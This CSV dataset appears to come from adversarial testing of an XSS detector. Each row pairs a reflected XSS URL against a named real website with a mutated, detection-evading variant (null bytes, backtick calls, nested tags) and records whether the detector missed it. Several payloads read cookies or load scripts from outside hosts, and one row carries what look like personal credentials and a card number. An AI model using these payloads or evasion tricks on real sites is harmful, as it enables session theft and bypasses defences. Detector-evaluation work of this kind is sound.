Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.beycanyacht.com/default.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.beycanyacht.com/default.php?lang=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.disccrs.org/abstracts.html?dialog=on&amp;disccrs=on&amp;match=or&amp;words=%3cscript%3edocument.docum<br>entelement.innerhtml%3d%22xss+found%22%3b%3c%2fscript%3e&amp;search=search&amp;search=search,"[['http://u', 'None', 'None', 'words=', '<script>', 'innerhtml=', '</script>', 'search=', 'search=']]",http://www.disccrs.org/abstracts.html?dialog=on&amp;disccrs=on&amp;match=or&amp;words=<script /drfv/document.docum<br entelement.innerhtml%3d%22xss+found%22%3b%3c%2fscript%3e&amp;search=search&amp;search=search,"[['http://u', 'None', 'None', 'words=', 'None', 'search=', 'search=']]",True
"https://security-shell.ws/radioandtv.php?ajax=updatelist&amp;letter=h%22%3cscript%3ealert(string.fromcha<br>rcode(88,83,83,69,68))%3c/script%3e","[['http://u', 'None', '<script>', 'alert(', 'string.fromcharcode(', 'None', ')', '</script>']]","https://security-shell.ws/radioandtv.php?ajax=updatelist&amp;letter=h%22%3c%00script%3ealert(string.fromcha<br rcode(88,83,83,69,68))%3c%00/script%3e","[['http://u', 'None', 'None', 'alert(', 'None']]",True
"http://www.toolboxrecords.com/fr/search//""><script>alert('xss+by+atm0n3r')</script>","[['http://www', '>', '<script>', 'alert(', ')', '</script>']]","http://www.toolboxrecords.com/fr/search//""><script><script>alert`'xss+by+atm0n3r'`</script></script>","[['http://www', '>', '<script>', '<script>', '</script>', '</script>']]",False
http://israel.solidcamsupport.net/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,"[['http://u', 'src=', 'None', 'type=', '>', '</script>', '<script>', 'alert(', 'None', ')', '</script>']]",http://israel.solidcamsupport.net/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&lt;script&lt;/script&lt;script&lt;/script&lt;script&lt;/script&lt;script&gt;alert`docu<br><br><br><br>ment.cookie`;&lt;/script&lt;script&lt;/script&lt;script&lt;/script&lt;script&lt;/script&lt;script&gt;alert`/kabus/`;&lt;/script&lt;/script&lt;/script&lt;/script&gt;,"[['http://u', 'src=', 'None', 'type=', 'None', 'None', 'None', 'None']]",True
http://img73.yfrog.com/gal.php?g=%3cscript%3ealert%28%22h4x0red%20by%20teh%20sora%20-%20greyhathacke<br>rs.net/org%22%29%3c/script%3e,"[['http://u', '<script>', 'alert(', ')', '</script>']]",editar.jsp?modo=registro&login=lzrd&password=capotudo&nombre=milorad&apellidos=sabando+trujillo&email=ronoro_dalya%40foreignoffice.nu&dni=00428255h&direccion=calle+esca%f1uela+76+&ciudad=ruanes&cp=41928&provincia=baleares+%28illes%29&ntc=9511633114834484&b1=registrarhttp://img73.yfrog.com/gal.php?g=<script /drfv/alert%28%22h4x0red%20by%20teh%20sora%20-%20greyhathacke<br rs.net/org%22%29%3c/script%3e,"[['http://u', 'login=', 'password=', 'nombre=', 'apellidos=', 'email=', 'dni=', 'direccion=', 'ciudad=', 'cp=', 'provincia=', 'None', ')', 'ntc=', 'b0=', 'None', 'None', 'None']]",False
http://parlorsongs.com/search.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://parlorsongs.com/search.asp?search=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://proj-obrs.web.cern.ch/proj-obrs/servlet/index?cookie=%22%3e%3cframe+name=xss+src=%22javascrip<br>t:alert(1)%22/%3e,"[['http://u', '>', 'None']]",http://proj-obrs.web.cern.ch/proj-obrs/servlet/index?cookie=%22%3cframe+name=xss+src=%22javascrip<br>t:alert(1)%22/%3e,"[['http://u', 'None']]",True
http://objekt-market.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://objekt-market.com/default.asp?say=&quot;&lt;%00script&gt;alert`&quot;backdoor&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.antikorupcija-savet.sr.gov.yu/view.jsp?articleid=%22%3e%3cscript%3ealert(1)%3c/script%3e%<br>3c/textarea%3e%3cscript%3ealert(%22kaksii_was_here%22)%3cscript%3ealert('kaksii_was_here');alert(1)%<br>3c/script%3e%22%3c/html%3e%3chtml%3e%3cscript%3ealert(10111)%3c/script%3e%3cdiv%20align=center%3e%20<br>%3cfont%20size=4%3e%3ctextarea%20name=1%20cols=100000%20rows=10000%20id=1%3ekaksii%20was%20here%3c/t<br>extarea%3e%3c/font%3e%3c/div%3e%3cnoscript%3e%3cplaintext%3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', 'None', 'None', 'None', '</textarea>', '</font>', '</div>', '<noscript>', '<plaintext>']]",//www.antikorupcija-savet.sr.gov.yu/view.jsp?articleid=%22%3cscript%00%3etop['al'+'ert']`1``1`%3c%00/script%3e%<br%0D 3c/textarea%3c%00script%3etop['al'+'ert']`1``%22kaksii_was_here%22`%3c%00script%3etop['al'+'ert']`1``'kaksii_was_here'`;top['al'+'ert']`1``1`%<br%0D 3c/script%3e%22%3c/html%00%3c%00html%3c%00script%3etop['al'+'ert']`1``10111`%3c/script%00%3c%00div%20align=center%3e%20<br%0D %3cfont%20size=4%00%3ctextarea%20name=1%20cols=100000%20rows=10000%20id=1%00%3ekaksii%20was%20here%3c/t<br%0D extarea%00%3c%00/font%3c/div%00%3cnoscript%00%3c%00plaintext%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
"http://www.budget.com/budgetsearch/sitesearch.jsp?ui_mode=question&amp;question_box=%22;alert(string.fro<br>mcharcode(88,83,83))//","[['http://u', 'None', 'alert(', 'string.fromcharcode(', '0,0,0)', ')']]","http://www.budget.com/budgetsearch/sitesearch.jsp?ui_mode=question&amp;question_box=%22;alert`string.fro<br>mcharcode`88,83,83``//","[['http://u', 'None']]",True
http://www.final4ever.com/redirector.php?url=%22%3e%3cscript+src=http://ckers.org/s%3e,"[['http://u', '>', 'None']]",http://www.final4ever.com/redirector.php?url=%22%3cscript+src=http://ckers.org/s%3e,"[['http://u', 'None']]",True
http://ec2-75-101-136-236.compute-1.amazonaws.com/search.php?cx=017782839116229869462%3aiaqf3zzj87m&amp;<br>cof=forid%3a10&amp;ie=utf-8&amp;q=%3cscript+src%3dhttp%3a%2f%2fha.ckers.org%2fxss.js%3e%3c%2fscript%3e&amp;sa.x=<br>11&amp;sa.y=12&amp;siteurl=%3cscript%20src=http://ha.ckers.org/xss.js%3e%3c/script%3e#204,"[['http://u', '0:', 'cof=', 'forid:', 'ie=', 'q=', '<script src=http://ha.ckers.org/xss.js>', '</script>', 'x=', 'y=', 'None', '<script src=http://ha.ckers.org/xss.js>', '</script>']]",defend-your-home-from-bugs&t=1396563191660&n=2597464&k=mainentityhttp://ec2-75-101-136-236.compute-1.amazonaws.com/search.php?cx=017782839116229869462%3aiaqf3zzj87m&amp;<br>cof=forid%3a10&amp;ie=utf-8&amp;q=%3cScRIPt+SrC%3DHTtp%3A%2f%2FHA.CKeRS.oRG%2FxsS.js%3c%2FScRIpt%3e&amp;sa.x=<br>11&amp;sa.y=12&amp;siteurl=%3CScriPt%20SrC=HTtp://hA.CkERs.Org/XSS.JS%3c/scRipt%3E#204,"[['http://u', 'n=', 'k=', 'None', 'None', '0:', 'cof=', 'forid:', 'ie=', 'q=', 'None', 'x=', 'y=', 'None', 'None']]",False
http://www.thinkgeek.com/brain/whereisit.cgi?t=%22%3e%3cscript%3ealert%28%27xssed%27%29%3b%3c%2fscri<br>pt%3e,"[['http://u', '>', '<script>', 'alert(', ""'xssed'"", ')', '</script>']]",http://www.thinkgeek.com/brain/whereisit.cgi?t=%22%3e%3cscript%3ealert%28%27xssed%27%29%3b%3c%2fscri<br>pt%3e,"[['http://u', '>', '<script>', 'alert(', ""'xssed'"", ')', '</script>']]",False
http://www.cfnielsen.com/material.php?id=17%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.cfnielsen.com/material.php?id=17%22%3cscript%3ealert%28document.cookie%29%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.businessnation.com/cgi-bin/bidsearch/search.cgi?keywords=%3cscript+src%3dhttp://vuln.xsse<br>d.net/thirdparty/scripts/hotpockets.js%3e,"[['http://u', '<script src=http://vuln.xssed.net/thirdparty/scripts/hotpockets.js>']]",http://www.businessnation.com/cgi-bin/bidsearch/search.cgi?keywords=%3c%00%00script+src%3dhttp://vuln.xsse<br%00>d.net/thirdparty/scripts/hotpockets.js%00%3c%00%00script+src%3dhttp://vuln.xsse<br%00>d.net/thirdparty/scripts/hotpockets.js%00%3e,"[['http://u', 'None', 'None', '>']]",False
http://www.troubledstreets.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.troubledstreets.com/register.php?ref=&lt;script%00&gt;alert`document.cookie`;&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.fahcsia.gov.au/internet/jennymacklin.nsf/search?searchview&amp;query=%22%3e%27%3e%3cscript%3e<br>alert(123)%3c/script%3e&amp;start=1&amp;count=10&amp;layout=main,"[['http://u', '>', '>', '<script>', 'alert(', '0', ')', '</script>', 'start=', 'None', 'None']]",http://www.fahcsia.gov.au/internet/jennymacklin.nsf/search?searchview&amp;query=%22%3e%27%3e<sc%00%00%00ript><sc%00ript%00%00>/drfv//drfv/<br%00%00%00><br%00%00%00>alert`123`%3c%00%00/script%3c/script%00%3e&amp;start=1&amp;count=10&amp;layout=main,"[['http://u', '>', '>', 'None', 'None', 'None', 'None', 'None', 'start=', 'None', 'None']]",False
http://www.dunav.com/site/search.php?intlangid=10&intcategoryid=227&q=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&x=7&y=10,"[['http://u', 'None', 'q=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'x=', 'y=']]",//www.dunav.com/site/search.php?intlangid=10&intcategoryid=227&q=%22%3cscript%3ealert%28document.cookie%29%3c/script%3e&x=7&y=10,"[['http://u', 'None', 'q=', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'x=', 'y=']]",False
http://www.livrariasaraiva.com.br/pesquisaweb/pesquisaweb.dll/pesquisa?id=c8cf50747d801110a02300217&amp;<br>filtron1=x&amp;filtron2=&amp;estrutn1=0301&amp;palavrasn1=%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e&amp;palavrasn2a=&amp;serieaux=*-*&amp;palavrasn3a=,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",http://www.livrariasaraiva.com.br/pesquisaweb/pesquisaweb.dll/pesquisa?id=c8cf50747d801110a02300217&amp;<br>filtron1=x&amp;filtron2=&amp;estrutn1=0301&amp;palavrasn1=%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%<br>3e&amp;palavrasn2=&amp;didatico=s&amp;grau=*-*&amp;serie=*-*&amp;idbanner=6946&amp;palavrasn1a=%3cscript+src%3dhttp%3a%2f%2f<br>mygot.110mb.com%2flol.js%3e&amp;palavrasn2a=&amp;serieaux=*-*&amp;palavrasn3a=,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://yufind.library.yale.edu/yufind/search/results?lookfor=%3cscript%3ealert%28%27**xssed**+by+cir<br>0%27%29%3b%3c%2fscript%3e&amp;type=allfields&amp;submit=find,"[['http://u', '<script>', 'alert(', ')', '</script>', 'type=', 'submit=']]",http://yufind.library.yale.edu/yufind/search/results?lookfor=%3c%00script%3c%00script%3ealert%28%27**xssed**+by+cir<br%00 <br%00 0%27%29%3b%3c%2fscript%00%3c%2fscript%00%3e&amp;type=allfields&amp;submit=find,"[['http://u', 'None', 'alert(', 'None', 'type=', 'submit=']]",True
http://www.sslazio.it/cms/view/home/mylazio/registrati/newsletter_homepage/s185?email=&quot;&gt;&lt;script&gt;aler<br>t('drakula')&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;dafeced by drakula&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.sslazio.it/cms/view/home/mylazio/registrati/newsletter_homepage/s185?email=&quot;&lt;script%00&gt;aler<br t`'drakula'`&lt;/script&lt;marquee&lt;%00h1&gt;dafeced by drakula&lt;/h1&lt;%00/marquee&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://apps.austria.com/tools/surfandwin/gewinnen/gewinnen.asp?meldung=&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://apps.austria.com/tools/surfandwin/gewinnen/gewinnen.asp?meldung=&lt;script%00&gt;alert`document.cookie<br%00>`&lt;/script%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://ticaret.yakamozdizayn.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://ticaret.yakamozdizayn.com/default.asp?say=&quot;&lt;%00script&gt;alert`&quot;backdoor&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://otona.com/parking.php4?task=search&amp;domain=otona.com&amp;trackquery=1&amp;s=2cfc133847ed44519331&amp;tb=0&amp;<br>a_id=1&amp;language=en&amp;pgt=44ovelawkmikewigrzia3maoahunv2ckhfpwzioyayaakaew0jandjgiqpwzvpbd1sm9pqe&amp;pxy_t<br>=0&amp;start=1&amp;add_c=4001b18452bee4d752136efe77c78d2a&amp;x=0&amp;y=0&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp<br>%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,"[['http://u', 'domain=', 'None', 's=', 'None', 'None', 'language=', 'None', 'None', 'start=', 'None', 'x=', 'y=', 'keyword=', '>', '>', '<script/src=http://kusomiso.com/x.js>', '</script>']]",http://otona.com/parking.php4?task=search&amp;domain=otona.com&amp;trackquery=1&amp;s=2cfc133847ed44519331&amp;tb=0&amp;<br>a_id=1&amp;language=en&amp;pgt=44ovelawkmikewigrzia3maoahunv2ckhfpwzioyayaakaew0jandjgiqpwzvpbd1sm9pqe&amp;pxy_t<br>=0&amp;start=1&amp;add_c=4001b18452bee4d752136efe77c78d2a&amp;x=0&amp;y=0&amp;keyword=%27%3e%22%3cscript%2fsrc%3dhttp<br>%3a%2f%2fkusomiso.com%2fx.js%3c%2fscript%3e,"[['http://u', 'domain=', 'None', 's=', 'None', 'None', 'language=', 'None', 'None', 'start=', 'None', 'x=', 'y=', 'keyword=', '>', 'None']]",False
http://www.pic.to/alert/input?url=%22%3e%3ciframe%20src%3d%2f%3e%3c%2fiframe%3e,"[['http://u', '>', 'None', '</iframe>']]",http://www.pic.to/alert/input?url=%22%3ciframe%20src%3d%2f%3c%2fiframe%3e,"[['http://u', 'None']]",True
https://www.ssl.com/searchadv.aspx?sku=&quot;<br>style=&quot;position:absolute;left:0;top:0;width:1920px;height:1200px;background-image:url(http://data.xs<br>sed.org/images/xssed_logo.gif);foo:exp/**/ression(alert('xss-ie-only')),"[['http://u', 'style=', 'None', 'None', 'None', 'None', 'None', 'None', 'url(', 'None', ')', 'None', 'None', 'alert(', 'None', ')']]",https://www.ssl.com/searchadv.aspx?sku=&quot;<br style=&quot;position:absolute;left:0;top:0;width:1920px;height:1200px;background-image:url(http://data.xs<br sed.org/images/xssed_logo.gif);foo:exp/**/ression(alert(xss-ie-only)),"[['http://u', 'None', 'style=', 'None', 'None', 'None', 'None', 'None', 'None', 'url(', 'None', 'None', ')', 'None', 'None', 'alert(', 'None', ')']]",False
http://www.jwatch.org/cgi/sectionsearch?jc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.jwatch.org/cgi/sectionsearch?jc=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://myboard.jp/i/plus_menu_view.php?pm_no='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3<br>c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://myboard.jp/i/plus_menu_view.php?pm_no='%3e%22%3c%00%00script/src=http://kusomiso.com/xss.js%3e%3<br%00%00>c/script%3e,"[['http://u', '>', 'None', 'None', '>']]",False
http://www.chinawto.com/wto/index-e.asp?sel=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.chinawto.com/wto/index-e.asp?sel=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.tufanmetal.com.tr/search.asp?=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""bluemax""', ')', '</script>']]",http://www.tufanmetal.com.tr/search.asp?=&quot;&lt;%00%00script&gt;alert`&quot;bluemax&quot;`&lt;%00/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.dirfile.com/siteredirect.php?x=a&amp;z=b&amp;siteurl=/siteredirect.php?x=a&amp;z=b&amp;siteurl=http://www<br>.xssed.com,"[['http://u', 'None', 'None', 'x=', 'None', 'None', 'http://www']]",http://www.dirfile.com/siteredirect.php?x=a&amp;z=b&amp;siteurl=/siteredirect.php?x=a&amp;z=b&amp;siteurl=http://www<br%00>.xssed.com,"[['http://u', 'None', 'None', 'x=', 'None', 'None', 'http://www', 'None']]",True
http://www.soundblaster.com/language.asp?sdesturl=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.soundblaster.com/language.asp?sdesturl=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.cosmeticscop.com/search/search.asp?keys=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=<br>0&amp;y=0,"[['http://u', '>', '</a>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'x=', 'y=']]",http://www.cosmeticscop.com/search/search.asp?keys=&quot;&lt;/a&lt;script%00&gt;alert`document.cookie`;&lt;%00/script&gt;&amp;x=<br%00>0&amp;y=0,"[['http://u', 'None', 'None', 'x=', 'None', 'y=']]",True
http://help.travian.fr/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_nemesis/);alert<br>(document.cookie);%3c/script%3e,"[['http://u', '>', '</script>', '<script>', 'alert(', 'None', ')', '</script>']]",http://help.travian.fr/index.php?type=%22%3c/script%3c%00script%3ealert`/xssed_by_nemesis/`;alert<br%00>`document.cookie`;%3c/script%00%3e,"[['http://u', 'None', 'None', 'None']]",True
http://www.sportsline.com/login?xurl=http%3a%2f%2fwww.sportsline.com%2f&amp;master_product=150&amp;id=%22%3c<br>script%3ealert%28%27gurus+here%21%21%27%29%3c%2fscript%3e&amp;password=&amp;x=75&amp;y=11,"[['http://u', 'http://www', 'None', 'id=', '<script>', 'alert(', ')', '</script>', 'password=', 'x=', 'y=']]",http://www.sportsline.com/login?xurl=http%3a%2f%2fwww.sportsline.com%2f&amp;master_product=150&amp;id=%22%3c<br script%3c<br script%3c<br script%3c<br script%3ealert%28%27gurus+here%21%21%27%29%3c%2fscript%3c%2fscript%3c%2fscript%3c%2fscript%3e&amp;password=&amp;x=75&amp;y=11,"[['http://u', 'http://www', 'None', 'id=', 'None', 'alert(', ')', 'None', 'password=', 'x=', 'y=']]",False
http://gumushanegsim.gov.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?optio<br>n=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http:<br>//xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://gumushanegsim.gov.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?optio<br n=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http:<br //xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'None', 'n=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'None', 'None']]",True
http://www.avis.com/avissearch/searchmain.jsp?ui_mode=question&amp;question_box=%27%3balert%28string.fro<br>mcharcode%2888%2c83%2c83%29%29%2f%2f,"[['http://u', 'None', 'alert(', 'string.fromcharcode(', '0,0,0)', ')']]",http://www.avis.com/avissearch/searchmain.jsp?ui_mode=question&amp;question_box=%27%3balert%28string.fro<br>mcharcode%2888%2c83%2c83%29%29%2f%2f,"[['http://u', 'None', 'alert(', 'string.fromcharcode(', '0,0,0)', ')']]",False
http://www.vigicrues.ecologie.gouv.fr/niv_spc.php?idspc=%22%3e'%3e%3cscript%20src=http://vuln.xssed.<br>net/thirdparty/scripts/python5.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>', '</script>']]",http://www.vigicrues.ecologie.gouv.fr/niv_spc.php?idspc=%22%3c%00script%20src=http://vuln.xssed.<br %00%00net/thirdparty/scripts/python5.js%3c%00/script%00%00%3e,"[['http://u', 'None']]",True
http://www.neobee.net/ccontent/sales?phpsessid=da471faac6ecc8d7f93635da98f91519%22%3e%3cscript%3eale<br>rt%28document.cookie%29;%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.neobee.net/ccontent/sales?phpsessid=da471faac6ecc8d7f93635da98f91519%22<script>/drfv//drfv//drfv/ale<br>rt%28document.cookie%29;%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.dur.ac.uk/dates/select_term/?period=epiphany%20term%202009}%3c/style%3e%3cscript%3ea=eval<br>;b=alert;a(b(/xss/.source));%3c/script%3e,"[['http://u', '</style>', '<script>', 'a=', 'b=', 'a(', 'b(', '/xss/.source)', ')', '</script>']]",http://www.dur.ac.uk/dates/select_term/?period=epiphany%20term%202009}%3c/style%00%3e<script /drfv//drfv/a=eval<script ;b=top[8680439.toString`30`]`1`;a`b`/xss/.source``;%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
http://www.lgbtcenters.org/centerstagegallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.lgbtcenters.org/centerstagegallery/igallery.asp?d=&quot;&lt;script&lt;script&gt;top['al'+'ert']`1``document.cookie`&lt;/scrip<br>t&lt;/scrip<br>t&lt;marquee&lt;h1&lt;marquee&lt;h1&gt;by%20narcoticxs&lt;/h1&lt;/marquee&lt;/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://onlyat.rovernet.eu/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://onlyat.rovernet.eu/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",True
http://www.tehrantimes.com/index_services.asp?chid=247&amp;name=politics%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', 'name=', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.tehrantimes.com/index_services.asp?chid=247&amp;name=politics%27%22%3c%00/title%3cscript%3<br%00 ealert`1337`%3c/script%3e%3c%00marquee%3ch1%00%3exss%20by%20xylitol%3c%00/h1%3c/marquee%00%3e,"[['http://u', 'name=', 'None', 'None', 'None']]",True
http://www.denizmedya.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', 'strkey=', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.denizmedya.com/search.asp?mtd=1&amp;strkey=&quot;&lt;%00script%00%00&lt;%00%00script%00&gt;alert`&quot;backdoor&quot;`&lt;%00%00%00/script&lt;%00%00%00/script&gt;,"[['http://u', 'strkey=', 'None', 'None']]",True
